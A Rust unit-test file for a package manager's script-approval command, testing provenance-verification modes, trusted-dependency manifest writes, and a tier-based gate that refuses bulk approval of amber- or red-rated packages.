use super::prelude::*;
use super::*;
use crate::build_state::{BUILD_STATE_VERSION, BlockedPackage, BuildState};
use crate::provenance_fetch::{EnforceMode, SkipPolicy, VerifyPolicy};
use lpm_workspace::TrustedDependencyBinding;
use std::ffi::OsString;
use std::fs;
use std::path::PathBuf;
use std::sync::OnceLock;
use tempfile::tempdir;

// ── snapshot_for_binding_with_mode (rollout knob) ───

const TEST_SECURITY_AUTH_RESULT_ENV: &str = "LPM_TEST_SECURITY_AUTH_RESULT";
const TEST_SECURITY_DIR_ENV: &str = "LPM_SECURITY_DIR";
const TEST_SECURITY_SECRET_ENV: &str = "LPM_TEST_SECURITY_SECRET_HEX";
const TEST_SECURITY_SECRET: &str =
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

fn security_test_dir() -> &'static PathBuf {
    static SECURITY_DIR: OnceLock<PathBuf> = OnceLock::new();
    SECURITY_DIR.get_or_init(|| {
        let dir = tempfile::tempdir().expect("security backend tempdir");
        let path = dir.path().to_path_buf();
        std::mem::forget(dir);
        path
    })
}

fn security_test_env_vars() -> [(&'static str, OsString); 3] {
    [
        (
            TEST_SECURITY_DIR_ENV,
            security_test_dir().as_os_str().to_owned(),
        ),
        (TEST_SECURITY_SECRET_ENV, TEST_SECURITY_SECRET.into()),
        (TEST_SECURITY_AUTH_RESULT_ENV, "approve".into()),
    ]
}

fn ensure_security_test_backend() -> crate::test_env::ScopedEnv {
    crate::test_env::ScopedEnv::set(security_test_env_vars())
}

fn scoped_lpm_home_with_security(path: &Path) -> crate::test_env::ScopedEnv {
    let mut vars = security_test_env_vars().to_vec();
    vars.push(("LPM_HOME", path.as_os_str().to_owned()));
    crate::test_env::ScopedEnv::set(vars)
}

struct RawEnvRestore {
    key: &'static str,
    value: Option<OsString>,
}

impl RawEnvRestore {
    fn capture(key: &'static str) -> Self {
        Self {
            key,
            value: std::env::var_os(key),
        }
    }
}

impl Drop for RawEnvRestore {
    fn drop(&mut self) {
        unsafe {
            match &self.value {
                Some(value) => std::env::set_var(self.key, value),
                None => std::env::remove_var(self.key),
            }
        }
    }
}

#[test]
fn ensure_security_test_backend_restores_auto_approval_env() {
    let _restore = RawEnvRestore::capture(TEST_SECURITY_AUTH_RESULT_ENV);
    unsafe {
        std::env::remove_var(TEST_SECURITY_AUTH_RESULT_ENV);
    }

    {
        let _security_backend = ensure_security_test_backend();
        assert_eq!(
            std::env::var(TEST_SECURITY_AUTH_RESULT_ENV).as_deref(),
            Ok("approve"),
        );
    }

    assert!(std::env::var_os(TEST_SECURITY_AUTH_RESULT_ENV).is_none());
}

fn trusted_esbuild_binding() -> TrustedDependencies {
    let mut bindings = HashMap::new();
    bindings.insert(
        "esbuild@0.25.1".to_string(),
        lpm_workspace::TrustedDependencyBinding {
            integrity: Some("sha512-esbuild-integrity".to_string()),
            script_hash: Some("sha256-esbuild-hash".to_string()),
            ..Default::default()
        },
    );
    TrustedDependencies::Rich(bindings)
}

#[test]
fn reviewed_project_trust_write_records_managed_approval() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    let trusted = trusted_esbuild_binding();

    authorize_project_trust_write(dir.path(), &trusted, true, true).unwrap();

    crate::security_approval::ensure_project_trust_candidate_authorized(
        dir.path(),
        &trusted,
        true,
        crate::security_approval::ApprovalSource::ProjectConfig,
    )
    .unwrap();
}

#[test]
fn unreviewed_project_trust_write_still_requires_security_approval() {
    let _restore = RawEnvRestore::capture(TEST_SECURITY_AUTH_RESULT_ENV);
    let _security_backend = ensure_security_test_backend();
    unsafe {
        std::env::remove_var(TEST_SECURITY_AUTH_RESULT_ENV);
    }
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    let trusted = trusted_esbuild_binding();

    let err = authorize_project_trust_write(dir.path(), &trusted, true, false)
        .expect_err("unreviewed trust mutation must stay guarded");

    assert_eq!(err.error_code(), "security_approval_required");
}

fn verified_status() -> ProvenanceStatus {
    ProvenanceStatus::Verified(ProvenanceSnapshot {
        present: true,
        publisher: Some("github:axios/axios".into()),
        workflow_path: Some(".github/workflows/publish.yml".into()),
        workflow_ref: Some("refs/tags/v1.14.0".into()),
        attestation_cert_sha256: Some("sha256-leaf-aaa".into()),
    })
}

fn map_with(
    name: &str,
    version: &str,
    status: ProvenanceStatus,
) -> HashMap<(String, String), ProvenanceStatus> {
    let mut m = HashMap::new();
    m.insert((name.to_string(), version.to_string()), status);
    m
}

/// Verified bundles project identically under both modes — the
/// mode only gates the rejection arm.
#[test]
fn snapshot_for_binding_verified_projects_under_both_modes() {
    let map = map_with("axios", "1.14.0", verified_status());
    let deny = snapshot_for_binding_with_mode(&map, "axios", "1.14.0", EnforceMode::Deny)
        .expect("Verified must succeed under Deny");
    let warn = snapshot_for_binding_with_mode(&map, "axios", "1.14.0", EnforceMode::Warn)
        .expect("Verified must succeed under Warn");
    assert_eq!(deny, warn);
    assert!(deny.is_some());
}

/// Under `Deny` (default production posture), a
/// `VerificationRejected` status returns
/// `Err(LpmError::ProvenanceVerification(_))` so the caller's
/// `?` short-circuits the approval. The prior trust binding (if
/// any) is preserved by the caller's read-modify-write NOT
/// executing.
#[test]
fn snapshot_for_binding_deny_refuses_on_verification_rejected() {
    let map = map_with(
        "axios",
        "1.14.1",
        ProvenanceStatus::VerificationRejected {
            reason: "DSSE signature mismatch".into(),
        },
    );
    let err = snapshot_for_binding_with_mode(&map, "axios", "1.14.1", EnforceMode::Deny)
        .expect_err("Deny mode must refuse on VerificationRejected");
    assert!(matches!(err, LpmError::ProvenanceVerification(_)));
    let msg = err.to_string();
    assert!(
        msg.contains("axios") && msg.contains("1.14.1"),
        "error must name the package + version, got: {msg}",
    );
    assert!(
        msg.contains("DSSE signature mismatch"),
        "underlying verifier reason must propagate, got: {msg}",
    );
}

/// Under `Warn` (rollout-window posture), a
/// `VerificationRejected` status returns `Ok(None)` so the
/// approval can proceed without a fresh verifier observation.
/// This is only one half of the warn-mode contract: the write
/// path then runs `approval_metadata_preserving_existing_provenance`
/// which substitutes the prior `provenance_at_approval` if one
/// exists, so a re-approval under Warn does NOT clear a
/// previously-verified snapshot. The preservation behavior is
/// pinned by
/// `approval_metadata_preserving_existing_provenance_preserves_prior_snapshot_on_none`
/// below; this test pins only the snapshot-projection seam.
#[test]
fn snapshot_for_binding_warn_returns_none_on_verification_rejected() {
    let map = map_with(
        "axios",
        "1.14.1",
        ProvenanceStatus::VerificationRejected {
            reason: "Rekor SET verification failed".into(),
        },
    );
    let result = snapshot_for_binding_with_mode(&map, "axios", "1.14.1", EnforceMode::Warn)
        .expect("Warn mode must allow the approval through");
    assert!(
        result.is_none(),
        "Warn mode records None (no verified identity) — the loud warn log is the operator contract",
    );
}

/// `Absent` and `TransportDegraded` are unchanged by the mode —
/// they're not attack signals, so the rollout knob doesn't gate
/// them.
#[test]
fn snapshot_for_binding_non_rejection_statuses_ignore_mode() {
    let absent_map = map_with("pkg", "1.0.0", ProvenanceStatus::Absent);
    let transport_map = map_with("pkg", "1.0.0", ProvenanceStatus::TransportDegraded);
    for mode in [EnforceMode::Deny, EnforceMode::Warn] {
        let absent = snapshot_for_binding_with_mode(&absent_map, "pkg", "1.0.0", mode)
            .expect("Absent must project under both modes");
        let snap = absent.expect("Absent projects to Some(present:false)");
        assert!(!snap.present);

        let transport = snapshot_for_binding_with_mode(&transport_map, "pkg", "1.0.0", mode)
            .expect("TransportDegraded must project under both modes");
        assert!(transport.is_none());
    }
}

/// A package missing from the batch map projects to `Ok(None)`
/// under both modes — same as the pre-rollout shape. The mode
/// only gates statuses that are present in the map.
#[test]
fn snapshot_for_binding_missing_pkg_projects_to_none_under_both_modes() {
    let map: HashMap<(String, String), ProvenanceStatus> = HashMap::new();
    for mode in [EnforceMode::Deny, EnforceMode::Warn] {
        let r = snapshot_for_binding_with_mode(&map, "pkg", "1.0.0", mode)
            .expect("missing pkg projects to Ok(None) regardless of mode");
        assert!(r.is_none());
    }
}

#[test]
fn approval_metadata_from_blocked_preserves_every_rich_binding_field() {
    let mut blocked = make_blocked("acme-widget", "1.0.0");
    blocked.behavioral_tags_hash = Some("sha256-behavioral-tags".into());
    blocked.behavioral_tags = Some(vec!["eval".into(), "network".into()]);
    let provenance = ProvenanceSnapshot {
        present: true,
        publisher: Some("github:acme/widget".into()),
        workflow_path: Some(".github/workflows/publish.yml".into()),
        workflow_ref: Some("refs/tags/v1.0.0".into()),
        attestation_cert_sha256: Some("sha256-leaf-cert".into()),
    };

    let metadata = approval_metadata_from_blocked(
        &blocked,
        Some("sha256-capability-set".into()),
        Some(provenance.clone()),
    );
    let mut trusted = TrustedDependencies::default();
    trusted.approve_with_metadata(&blocked.name, &blocked.version, metadata);

    assert_eq!(
        trusted.get_binding(&blocked.name, &blocked.version),
        Some(&TrustedDependencyBinding {
            integrity: blocked.integrity,
            script_hash: blocked.script_hash,
            provenance_at_approval: Some(provenance),
            behavioral_tags_hash: blocked.behavioral_tags_hash,
            behavioral_tags: blocked.behavioral_tags,
            capability_hash: Some("sha256-capability-set".into()),
        })
    );
}

/// Load-bearing warn-mode regression guard: when the snapshot
/// projection returns `None` (Warn + VerificationRejected, or
/// any TransportDegraded), an existing exact-version binding's
/// `provenance_at_approval` MUST be preserved rather than
/// overwritten. Re-approving the same version with a `None`
/// snapshot must not silently clear the prior verified identity
/// and disarm drift detection.
#[test]
fn approval_metadata_preserving_existing_provenance_preserves_prior_snapshot_on_none() {
    let prior_snap = ProvenanceSnapshot {
        present: true,
        publisher: Some("github:acme/widget".into()),
        workflow_path: Some(".github/workflows/publish.yml".into()),
        workflow_ref: Some("refs/tags/v1.0.0".into()),
        attestation_cert_sha256: Some("sha256-leaf-prior".into()),
    };
    let mut trusted = TrustedDependencies::default();
    trusted.approve_with_metadata(
        "acme-widget",
        "1.0.0",
        ApprovalMetadata {
            integrity: Some("sha512-prior".into()),
            script_hash: Some("sha256-prior".into()),
            provenance_at_approval: Some(prior_snap),
            behavioral_tags_hash: None,
            behavioral_tags: None,
            capability_hash: None,
        },
    );

    let blocked = make_blocked("acme-widget", "1.0.0");
    let meta = approval_metadata_preserving_existing_provenance(&trusted, &blocked, None, None);
    let preserved = meta
        .provenance_at_approval
        .expect("preservation must substitute prior snapshot when incoming is None");
    assert_eq!(preserved.publisher.as_deref(), Some("github:acme/widget"));
    assert_eq!(
        preserved.attestation_cert_sha256.as_deref(),
        Some("sha256-leaf-prior"),
        "preserved snapshot must be the exact prior binding's snapshot, byte-for-byte",
    );
}

/// A fresh Verified observation always wins over the prior
/// snapshot. Without this assertion the preservation logic
/// could mask a legitimate identity change (publisher rotated,
/// workflow path moved) by sticking with the stale prior value.
#[test]
fn approval_metadata_preserving_existing_provenance_lets_fresh_verified_win() {
    let prior_snap = ProvenanceSnapshot {
        present: true,
        publisher: Some("github:acme/widget".into()),
        attestation_cert_sha256: Some("sha256-leaf-prior".into()),
        ..Default::default()
    };
    let mut trusted = TrustedDependencies::default();
    trusted.approve_with_metadata(
        "acme-widget",
        "1.0.0",
        ApprovalMetadata {
            provenance_at_approval: Some(prior_snap),
            ..Default::default()
        },
    );

    let new_snap = ProvenanceSnapshot {
        present: true,
        publisher: Some("github:acme/widget".into()),
        attestation_cert_sha256: Some("sha256-leaf-NEW".into()),
        ..Default::default()
    };
    let blocked = make_blocked("acme-widget", "1.0.0");
    let meta =
        approval_metadata_preserving_existing_provenance(&trusted, &blocked, None, Some(new_snap));
    assert_eq!(
        meta.provenance_at_approval
            .expect("incoming Some must pass through")
            .attestation_cert_sha256
            .as_deref(),
        Some("sha256-leaf-NEW"),
        "fresh Verified snapshot must replace the prior — preservation only fires on None",
    );
}

/// First-time approval (no prior binding) with a `None` incoming
/// snapshot still records `None` — there's nothing to preserve.
#[test]
fn approval_metadata_preserving_existing_provenance_passes_none_through_on_first_approval() {
    let trusted = TrustedDependencies::default();
    let blocked = make_blocked("first-time-pkg", "1.0.0");
    let meta = approval_metadata_preserving_existing_provenance(&trusted, &blocked, None, None);
    assert!(
        meta.provenance_at_approval.is_none(),
        "first-time approval with no prior binding has nothing to preserve",
    );
}

fn write_manifest(path: &Path, value: &serde_json::Value) {
    fs::write(path, serde_json::to_string_pretty(value).unwrap()).unwrap();
}

fn read_manifest(path: &Path) -> serde_json::Value {
    serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap()
}

fn make_blocked(name: &str, version: &str) -> BlockedPackage {
    BlockedPackage {
        name: name.to_string(),
        version: version.to_string(),
        integrity: Some(format!("sha512-{name}-integrity")),
        script_hash: Some(format!("sha256-{name}-hash")),
        phases_present: vec!["postinstall".to_string()],
        binding_drift: false,
        // fields default to None for these approve-scripts
        // tests; dedicated tier-aware tests land in+.
        static_tier: None,
        provenance_at_capture: None,
        published_at: None,
        behavioral_tags_hash: None,
        behavioral_tags: None,
    }
}

/// helper: `make_blocked` + explicit tier.
/// Used by the `--yes` refusal tests below to construct state
/// that would be produced by a fresh install pipeline.
fn make_blocked_tiered(
    name: &str,
    version: &str,
    tier: lpm_security::triage::StaticTier,
) -> BlockedPackage {
    let mut b = make_blocked(name, version);
    b.static_tier = Some(tier);
    b
}

fn write_state(project_dir: &Path, blocked: Vec<BlockedPackage>) {
    let state = BuildState {
        state_version: BUILD_STATE_VERSION,
        blocked_set_fingerprint: "sha256-test".to_string(),
        captured_at: "T00:00:00Z".to_string(),
        blocked_packages: blocked,
        drift_ignore_override: None,
    };
    crate::build_state::write_build_state(project_dir, &state).unwrap();
}

fn write_default_manifest(dir: &Path) {
    write_manifest(
        &dir.join("package.json"),
        &serde_json::json!({"name": "test", "version": "0.0.0"}),
    );
}

// ── Argument validation ─────────────────────────────────────────

#[tokio::test]
async fn approve_scripts_yes_and_list_together_hard_errors() {
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
    let err = run(dir.path(), None, true, true, false, true)
        .await
        .unwrap_err();
    let msg = err.to_string();
    assert!(msg.contains("--list") && msg.contains("--yes"));
}

#[tokio::test]
async fn approve_scripts_list_with_pkg_arg_hard_errors() {
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
    let err = run(dir.path(), Some("esbuild"), false, true, false, true)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("--list"));
}

#[tokio::test]
async fn approve_scripts_with_no_state_file_errors_with_install_first_message() {
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    // No state file written
    let err = run(dir.path(), None, false, true, false, true)
        .await
        .unwrap_err();
    let msg = err.to_string();
    assert!(msg.contains("lpm install"));
}

#[tokio::test]
async fn approve_scripts_with_no_package_json_errors() {
    let dir = tempdir().unwrap();
    // No package.json
    let err = run(dir.path(), None, false, true, false, true)
        .await
        .unwrap_err();
    let msg = err.to_string();
    assert!(msg.contains("package.json"));
}

#[tokio::test]
async fn approve_scripts_with_empty_blocked_set_succeeds_silently() {
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![]);
    // --list mode with empty blocked set should succeed
    let result = run(dir.path(), None, false, true, false, true).await;
    assert!(result.is_ok());
}

// ── --list mode ─────────────────────────────────────────────────

#[tokio::test]
async fn approve_scripts_list_does_not_mutate_package_json() {
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
    let before = fs::read_to_string(dir.path().join("package.json")).unwrap();
    run(dir.path(), None, false, true, false, true)
        .await
        .unwrap();
    let after = fs::read_to_string(dir.path().join("package.json")).unwrap();
    assert_eq!(before, after, "--list must NOT mutate package.json");
}

// ── --yes (bulk approve) ────────────────────────────────────────

#[tokio::test]
async fn approve_scripts_yes_approves_everything_and_writes_rich_form() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(
        dir.path(),
        vec![
            make_blocked("esbuild", "0.25.1"),
            make_blocked("sharp", "0.33.0"),
        ],
    );

    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    let td = &after["lpm"]["trustedDependencies"];
    assert!(td.is_object(), "must be Rich (object) form, got: {td}");
    let map = td.as_object().unwrap();
    assert!(map.contains_key("esbuild@0.25.1"));
    assert!(map.contains_key("sharp@0.33.0"));
    // Both bindings preserved
    assert_eq!(map["esbuild@0.25.1"]["scriptHash"], "sha256-esbuild-hash");
    assert_eq!(
        map["esbuild@0.25.1"]["integrity"],
        "sha512-esbuild-integrity"
    );
}

#[tokio::test]
async fn approve_scripts_yes_emits_warning_in_json_mode() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
    // Capturing stdout in nextest is tricky; instead just verify the
    // command succeeds and the manifest mutation lands. The warning
    // emission via tracing::warn is exercised by the integration path.
    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();
    let after = read_manifest(&dir.path().join("package.json"));
    assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
}

#[tokio::test]
async fn approve_scripts_yes_legacy_array_upgrades_to_rich() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_manifest(
        &dir.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "0.0.0",
            "lpm": {
                "trustedDependencies": ["sharp"],
            },
        }),
    );
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    let td = &after["lpm"]["trustedDependencies"];
    assert!(td.is_object(), "legacy array must be upgraded to Rich");
    let map = td.as_object().unwrap();
    // New approval
    assert!(map.contains_key("esbuild@0.25.1"));
    // Legacy entry preserved as `<name>@*`
    assert!(map.contains_key("sharp@*"));
}

#[tokio::test]
async fn approve_scripts_yes_preserves_unrelated_manifest_fields() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_manifest(
        &dir.path().join("package.json"),
        &serde_json::json!({
            "name": "test",
            "version": "1.2.3",
            "scripts": {"build": "tsc"},
            "dependencies": {"react": "^18.0.0"},
            "lpm": {"linker": "isolated"},
        }),
    );
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    assert_eq!(after["name"], "test");
    assert_eq!(after["version"], "1.2.3");
    assert_eq!(after["scripts"]["build"], "tsc");
    assert_eq!(after["dependencies"]["react"], "^18.0.0");
    // Existing lpm fields preserved
    assert_eq!(after["lpm"]["linker"], "isolated");
    // New trustedDependencies added
    assert!(after["lpm"]["trustedDependencies"].is_object());
}

// ── <pkg> argument ──────────────────────────────────────────────

#[tokio::test]
async fn approve_scripts_specific_package_by_name_approves_only_that_one() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(
        dir.path(),
        vec![
            make_blocked("esbuild", "0.25.1"),
            make_blocked("sharp", "0.33.0"),
        ],
    );

    // json_output=true so the confirm prompt is bypassed (auto-approve)
    run(dir.path(), Some("esbuild"), false, false, false, true)
        .await
        .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    let map = after["lpm"]["trustedDependencies"]
        .as_object()
        .expect("must be Rich");
    assert!(
        map.contains_key("esbuild@0.25.1"),
        "esbuild must be approved"
    );
    assert!(
        !map.contains_key("sharp@0.33.0"),
        "sharp must NOT be approved (was not the target)"
    );
}

#[tokio::test]
async fn approve_scripts_specific_package_with_at_version_approves_only_that_one() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

    run(
        dir.path(),
        Some("esbuild@0.25.1"),
        false,
        false,
        false,
        true,
    )
    .await
    .unwrap();

    let after = read_manifest(&dir.path().join("package.json"));
    assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
}

#[tokio::test]
async fn approve_scripts_specific_package_not_in_blocked_set_errors() {
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

    let err = run(dir.path(), Some("not-installed"), false, false, false, true)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("not in the blocked set"));
}

#[tokio::test]
async fn approve_scripts_unknown_package_errors_before_security_store_read() {
    let _home_restore = RawEnvRestore::capture("LPM_HOME");
    let _secret_restore = RawEnvRestore::capture(TEST_SECURITY_SECRET_ENV);
    let _auth_restore = RawEnvRestore::capture(TEST_SECURITY_AUTH_RESULT_ENV);
    let lpm_home = tempdir().unwrap();
    unsafe {
        std::env::set_var("LPM_HOME", lpm_home.path());
        std::env::set_var(TEST_SECURITY_SECRET_ENV, "not-hex");
        std::env::set_var(TEST_SECURITY_AUTH_RESULT_ENV, "error");
    }

    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

    let err = run(dir.path(), Some("not-installed"), false, false, false, true)
        .await
        .unwrap_err();
    assert!(err.to_string().contains("not in the blocked set"));
}

#[tokio::test]
async fn find_blocked_by_arg_handles_scoped_names_with_at_in_scope() {
    // Sanity check: a scoped name `@scope/pkg` should match the bare-name
    // path, not be misparsed as `name@version` with empty name. The
    // helper checks `at > 0` to avoid the leading-`@` confusion.
    let blocked = vec![
        make_blocked("@scope/pkg", "1.0.0"),
        make_blocked("plain", "2.0.0"),
    ];
    let by_bare_scoped = find_blocked_by_arg(&blocked, "@scope/pkg");
    assert!(by_bare_scoped.is_some());
    assert_eq!(by_bare_scoped.unwrap().name, "@scope/pkg");

    let by_versioned_scoped = find_blocked_by_arg(&blocked, "@scope/pkg@1.0.0");
    assert!(by_versioned_scoped.is_some());

    let by_plain = find_blocked_by_arg(&blocked, "plain");
    assert_eq!(by_plain.unwrap().name, "plain");
}

// ── Atomic write semantics ──────────────────────────────────────

#[tokio::test]
async fn approve_scripts_writes_atomic_via_temp_file_rename() {
    let _security_backend = ensure_security_test_backend();
    let dir = tempdir().unwrap();
    write_default_manifest(dir.path());
    write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
    run(dir.path(), None, true, false, false, true)
        .await
        .unwrap();

    // After a successful run, the parent directory should NOT contain
    // any leftover `.tmp` artifacts.
    let entries = std::fs::read_dir(dir.path()).unwrap();
    for entry in entries.flatten() {
        let name = entry.file_name();
        let s = name.to_string_lossy();
        assert!(
            !s.ends_with(".tmp") && !s.contains(".package.json."),
            "tempfile leaked: {s}"
        );
    }
}

// ── Schema versioning ───────────────────────────────────────────

#[test]
fn schema_version_is_at_least_1() {
    const _: () = assert!(SCHEMA_VERSION >= 1);
}

#[test]
fn schema_version_bumped_for_static_tier() {
    // bumped to 2 when `static_tier` was
    // added to the blocked-entry JSON shape. If this test fails
    // because the version dropped, either a revert or a second
    // migration is needed — don't just bump the assertion.
    const _: () = assert!(SCHEMA_VERSION >= 2);
}

#[test]
fn schema_version_bumped_for_version_diff() {
    // bumped to 3 when `version_diff` was
    // added to the blocked-entry JSON shape. If this test fails
    // because the version dropped, either a revert or a second
    // migration is needed — don't just bump the assertion.
    const _: () = assert!(SCHEMA_VERSION >= 3);
}

// ── — blocked_to_json + tier labels ─────────

#[test]
fn blocked_to_json_emits_static_tier_green() {
    use lpm_security::triage::StaticTier;
    let mut b = make_blocked("esbuild", "0.25.1");
    b.static_tier = Some(StaticTier::Green);
    let v = blocked_to_json(&b, &TrustedDependencies::default());
    assert_eq!(v["static_tier"], serde_json::json!("green"));
}

#[test]
fn blocked_to_json_emits_static_tier_amber() {
    use lpm_security::triage::StaticTier;
    let mut b = make_blocked("playwright", "1.48.0");
    b.static_tier = Some(StaticTier::Amber);
    let v = blocked_to_json(&b, &TrustedDependencies::default());
    assert_eq!(v["static_tier"], serde_json::json!("amber"));
}

#[test]
fn blocked_to_json_emits_static_tier_amber_llm() {
    use lpm_security::triage::StaticTier;
    let mut b = make_blocked("custom-tool", "1.0.0");
    b.static_tier = Some(StaticTier::AmberLlm);
    let v = blocked_to_json(&b, &TrustedDependencies::default());
    // Kebab-case wire contract (crate::triage's serde form).
    assert_eq!(v["static_tier"], serde_json::json!("amber-llm"));
}

#[test]
fn blocked_to_json_emits_static_tier_red() {
    use lpm_security::triage::StaticTier;
    let mut b = make_blocked("malware", "0.0.1");
    b.static_tier = Some(StaticTier::Red);
    let v = blocked_to_json(&b, &TrustedDependencies::default());
    assert_eq!(v["static_tier"], serde_json::json!("red"));
}

#[test]
fn blocked_to_json_emits_null_when_tier_absent() {
    // Pre-P2 persisted state leaves `static_tier` as None; the
    // field MUST appear as `null` (not be omitted) so agents can
    // distinguish "no tier known" from "field missing".
    let b = make_blocked("pre-p2", "1.0.0");
    assert!(b.static_tier.is_none());
    let v = blocked_to_json(&b, &TrustedDependencies::default());
    assert_eq!(v["static_tier"], serde_json::Value::Null);
    // And the key is present in the object (not omitted).
    assert!(
        v.as_object().unwrap().contains_key("static_tier"),
        "static_tier key must be present in the JSON object even \
             when the value is null — agents rely on presence to \
             distinguish null-value from schema-missing",
    );
}

#[test]
fn tier_label_text_distinct_per_variant() {
    use lpm_security::triage::StaticTier;
    let labels = [
        tier_label_text(StaticTier::Green),
        tier_label_text(StaticTier::Amber),
        tier_label_text(StaticTier::AmberLlm),
        tier_label_text(StaticTier::Red),
    ];
    let mut seen = std::collections::HashSet::new();
    for lbl in labels {
        assert!(
            seen.insert(lbl),
            "tier labels must be distinct; duplicate: {lbl}"
        );
    }
}

#[test]
fn tier_label_text_green_starts_with_green() {
    use lpm_security::triage::StaticTier;
    // Pin the user-facing text: green labels must start with
    // "green" so the terminal user sees a recognizable word
    // before any symbol or parenthetical.
    assert!(tier_label_text(StaticTier::Green).starts_with("green"));
    assert!(tier_label_text(StaticTier::Amber).starts_with("amber"));
    assert!(tier_label_text(StaticTier::AmberLlm).starts_with("amber"));
    assert!(tier_label_text(StaticTier::Red).starts_with("red"));
}

#[test]
fn colored_tier_label_embeds_plain_text() {
    use lpm_security::triage::StaticTier;
    // The colored form must contain the plain text somewhere
    // (after stripping ANSI codes would be ideal, but substring
    // is enough since none of the plain-text forms collide with
    // ANSI escape sequence bytes).
    for tier in [
        StaticTier::Green,
        StaticTier::Amber,
        StaticTier::AmberLlm,
        StaticTier::Red,
    ] {
        let plain = tier_label_text(tier);
        let colored = colored_tier_label(tier);
        assert!(
            colored.contains(plain),
            "colored label for {tier:?} must contain the plain-text \
                 form; plain={plain:?} colored={colored:?}"
        );
    }
}

// ── — enforce_tiered_yes_gate ───────────────
//
// Pure tests for the refusal helper. End-to-end `--yes` tests
// live in the `run()` suite below (same test file, later
// section).

#[test]
fn yes_gate_empty_blocked_set_is_ok() {
    // Edge case: --yes against an empty effective blocked set
    // is a no-op today (approves nothing). The gate must not
    // refuse in this case.
    let blocked: Vec<BlockedPackage> = Vec::new();
    assert!(enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok());
}

#[test]
fn yes_gate_allows_all_green() {
    use lpm_security::triage::StaticTier;
    let blocked = vec![
        make_blocked_tiered("pkg-a", "1.0.0", StaticTier::Green),
        make_blocked_tiered("pkg-b", "2.0.0", StaticTier::Green),
    ];
    assert!(
        enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok(),
        "an all-green effective set must pass the --yes gate"
    );
}

#[test]
fn yes_gate_allows_none_tiered_legacy_state() {
    // Pre-P2 persisted state carries static_tier = None. The
    // gate must pass `None` through to preserve existing --yes
    // muscle memory during a → upgrade; the next install
    // will recapture the state with real tiers.
    let blocked = vec![make_blocked("esbuild", "0.25.1")];
    assert!(blocked[0].static_tier.is_none());
    assert!(
        enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok(),
        "None static_tier (pre-P2 legacy state) must pass through \
             the --yes gate"
    );
}

#[test]
fn yes_gate_allows_mixed_green_and_none() {
    use lpm_security::triage::StaticTier;
    let blocked = vec![
        make_blocked_tiered("fresh-green", "1.0.0", StaticTier::Green),
        make_blocked("legacy", "1.0.0"),
    ];
    assert!(enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok());
}

#[test]
fn yes_gate_refuses_single_amber() {
    use lpm_security::triage::StaticTier;
    let blocked = vec![make_blocked_tiered(
        "playwright",
        "1.48.0",
        StaticTier::Amber,
    )];
    let err = enforce_tiered_yes_gate(&blocked, GateScope::Project).expect_err("amber must refuse");
    let msg = err.to_string();
    assert!(msg.contains("--yes refuses"), "got: {msg}");
    assert!(msg.contains("playwright@1.48.0"), "got: {msg}");
}

#[test]
fn yes_gate_refuses_single_amber_llm() {
    use lpm_security::triage::StaticTier;
    let blocked = vec![make_blocked_tiered(
        "mystery",
        "3.0.0",
        StaticTier::AmberLlm,
    )];
    let err =
        enforce_tiered_yes_gate(&blocked, GateScope::Project).expect_err("amber-llm must refuse");
    assert!(err.to_string().contains("--yes refuses"));
}

#[test]
fn yes_gate_refuses_single_red() {
    use lpm_security::triage::StaticTier;
    let blocked = vec![make_blocked_tiered("evil-pkg", "0.0.1", StaticTier::Red)];
    let err = enforce_tiered_yes_gate(&blocked, GateScope::Project).expect_err("red must refuse");
    assert!(err.to_string().contains("--yes refuses"));
}

#[test]
fn yes_gate_refuses_mix_and_lists_only_refusals() {
    use lpm_security::triage::StaticTier;
    let blocked = vec![
        make_blocked_tiered("safe-a", "1.0.0", StaticTier::Green),
